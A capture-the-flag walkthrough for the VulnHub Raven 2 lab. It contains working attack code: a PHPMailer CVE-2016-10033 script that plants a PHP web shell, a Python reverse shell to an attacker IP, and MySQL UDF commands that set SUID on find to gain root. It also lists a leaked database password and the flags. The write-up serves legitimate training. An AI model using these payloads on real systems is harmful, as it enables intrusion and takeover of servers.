# Raven 2 - https://www.vulnhub.com/entry/raven-2,269/ 

First of all, add raven.local to your *_/etc/hosts_*.

After that, let's run nmap.

```nmap -T4 -A -sC -sV -p- -v raven.local```
```
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)
|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)
|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)
|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Raven Security
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          37560/tcp  status
|_  100024  1          38449/udp  status
37560/tcp open  status  1 (RPC #100024)
```
Let's just open a browser and see what we are working with.
After we went through a webpage manually, let's just enumerate a little bit more.

```gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://raven.local```
This should be enough to gives us a start point.

```
/img (Status: 301)
/css (Status: 301)
/wordpress (Status: 301)
/manual (Status: 301)
/js (Status: 301)
/vendor (Status: 301)
/fonts (Status: 301)
/exp (Status: 200)
/server-status (Status: 403)
```
Let's check findinds manually to see if there is something interesting.

```http://raven.local/vendor/PATH``` contains our first flag.

Flag1: *flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}*

Also, it contains an important piece of information: **phpmailer**. 

Let us continue. From the findings we can see that there is a *wordpress* blog. 
And of course, we will enumerate it too !
```wpscan --url http://raven.local/wordpress```

After it is done, we got an *_directory listing enabled_* 
```http://raven.local/wordpress/wp-content/uploads/``` it led us the third flag in a picture format.

Flag3: *_flag3{a0f568aa9de277887f37730d71520d9b}_*

Strange that we didn't find flag2. I remember that there is a phpmailer exploit that lead to rce. 
*https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html*

After reviewing the exploit, I wrote a small script that should make the whole process easier. 

First of all let us upload a shell. For that you can use BurpSuite or just use python with requests lib just as i did. 

``` import requests

    host = "http://raven.local/contact.php"
    payload='"attacker\\" -oQ/tmp/ -Xhack.php  some"@email.com'
    pay={'action':'submit','name':'hacker','email':payload,'message':'<?php system($_GET["cmd"]); ?>'}
    requests.post(host, data=pay)
    print("File uploaded, go to http://raven.local/hack.php?cmd=ls and have fun !")
```
This part uploaded shell and let us gain reverse shell now:

  ```
    host="http://raven.local/hack.php?cmd="
    com = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.106\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    req=requests.post(host+com)
    print("Done !")
   ```
and we are in ! (You can find complete code https://github.com/m-veljkovic/CTF-helpers/blob/master/Raven%202/exploit'n'shell.py but i encourage you to understand what is going on before just running it.)

Now let's enumerate some more. 
We found second flag in *_/var/www/_*
Flag2: *_flag2{6a8ed560f0b5358ecf844108048eb337}_*

Now let's go for flag4 !

In wordpress directory there is always a *_wp-config.php_* file which contains mysql password, after checking it, we got the password
**R@v3nSecurity**. We are gonna save it for later.

I was stuck here for a while, and I read Raven 1 writeup, in which we would exploit UDF dynamic library. We can try that.

Let's download exploit from https://www.exploit-db.com/exploits/1518/.
I renamed it to udf. And we will compile it at our machine: ```gcc -g -shared -Wl,-soname,udf.so -o udf.so udf.c -lc```

Now start ```python -m SimpleHTTPServer 80``` and download the file to the /var/www.
Login to mysql ```mysql -u root --password=R@v3nSecurity``` 
We are going to use same steps as in Raven 1.
```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/var/www/udf.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/udf.so';
create function do_system returns integer soname 'udf.so';
select do_system('chmod u+s /usr/bin/find');
``` 
Exit from mysql and continue typing 
```
touch hacker
find hacker –exec "whoami" \;
find hacker –exec "/bin/sh" \;
cd /root
ls
cat flag4.txt
```
Final flag4 is: *_flag4{df2bc5e951d91581467bb9a2a8ff4425}_*

That would be all. This machine was so cool, kudos to creator **@mccannwj / wjmccann.github.io**
